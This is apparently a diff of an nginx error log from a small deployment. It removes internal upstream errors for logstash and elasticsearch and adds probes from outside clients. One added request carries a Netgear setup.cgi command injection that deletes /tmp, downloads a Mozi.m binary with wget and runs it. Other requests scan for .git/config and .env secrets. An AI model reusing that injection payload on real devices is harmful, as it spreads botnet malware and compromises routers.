@@ -1,29 +1,6 @@
-2020/02/25 19:40:06 [error] 6#6: *1 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 172.21.0.1, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "localhost:8080", referrer: "http://localhost:8080/"
-2020/02/25 22:07:46 [notice] 2772#2772: signal process started
-2020/02/25 22:10:19 [notice] 2783#2783: signal process started
-2020/02/25 22:12:59 [notice] 2795#2795: signal process started
-2020/02/25 22:14:42 [notice] 2802#2802: signal process started
-2020/02/26 05:55:39 [notice] 2747#2747: signal process started
-2020/02/26 05:58:09 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:58:16 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:58:22 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:58:29 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:58:36 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:59:29 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:59:36 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 05:59:48 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:00:00 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:00:06 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:00:13 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:00:30 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:00:51 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:01:08 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:01:30 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 06:01:36 [emerg] 1#1: host not found in upstream "logstash1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
-2020/02/26 08:38:51 [error] 6#6: *759 connect() failed (111: Connection refused) while connecting to upstream, client: 10.0.0.2, server: , request: "GET /_cluster/health?pretty HTTP/1.1", upstream: "http://10.0.1.15:9200/_cluster/health?pretty", host: "10.128.0.26:19200"
-2020/02/26 08:38:51 [warn] 6#6: *759 upstream server temporarily disabled while connecting to upstream, client: 10.0.0.2, server: , request: "GET /_cluster/health?pretty HTTP/1.1", upstream: "http://10.0.1.15:9200/_cluster/health?pretty", host: "10.128.0.26:19200"
-2020/02/26 08:38:51 [error] 6#6: *759 connect() failed (111: Connection refused) while connecting to upstream, client: 10.0.0.2, server: , request: "GET /_cluster/health?pretty HTTP/1.1", upstream: "http://10.0.1.19:9200/_cluster/health?pretty", host: "10.128.0.26:19200"
-2020/02/26 08:38:51 [warn] 6#6: *759 upstream server temporarily disabled while connecting to upstream, client: 10.0.0.2, server: , request: "GET /_cluster/health?pretty HTTP/1.1", upstream: "http://10.0.1.19:9200/_cluster/health?pretty", host: "10.128.0.26:19200"
-2020/02/26 08:38:51 [error] 6#6: *759 connect() failed (111: Connection refused) while connecting to upstream, client: 10.0.0.2, server: , request: "GET /_cluster/health?pretty HTTP/1.1", upstream: "http://10.0.1.23:9200/_cluster/health?pretty", host: "10.128.0.26:19200"
-2020/02/26 08:38:51 [warn] 6#6: *759 upstream server temporarily disabled while connecting to upstream, client: 10.0.0.2, server: , request: "GET /_cluster/health?pretty HTTP/1.1", upstream: "http://10.0.1.23:9200/_cluster/health?pretty", host: "10.128.0.26:19200"
-2020/02/26 12:07:36 [emerg] 1#1: host not found in upstream "elasticsearch1:9200" in /etc/nginx/conf.d/load-balancer.conf:2
+2020/02/26 18:16:12 [error] 6#6: *4 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 79.101.58.51, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2020/02/26 20:27:37 [error] 6#6: *10 open() "/usr/share/nginx/html/v2/_catalog" failed (2: No such file or directory), client: 51.158.118.213, server: localhost, request: "GET /v2/_catalog HTTP/1.1", host: "104.155.141.20:80"
+2020/02/26 20:27:37 [error] 6#6: *11 open() "/usr/share/nginx/html/.git/config" failed (2: No such file or directory), client: 51.158.118.213, server: localhost, request: "GET /.git/config HTTP/1.1", host: "104.155.141.20:80"
+2020/02/26 20:27:37 [error] 6#6: *12 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 51.158.118.213, server: localhost, request: "GET /.env HTTP/1.1", host: "104.155.141.20:80"
+2020/02/26 20:59:55 [error] 7#7: *12 open() "/usr/share/nginx/html/dfgerfg" failed (2: No such file or directory), client: 185.155.17.158, server: localhost, request: "GET /dfgerfg HTTP/1.1", host: "104.155.141.20"
+2020/02/26 22:05:30 [error] 6#6: *39 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 45.152.6.58, server: localhost, request: "HEAD /robots.txt HTTP/1.0"
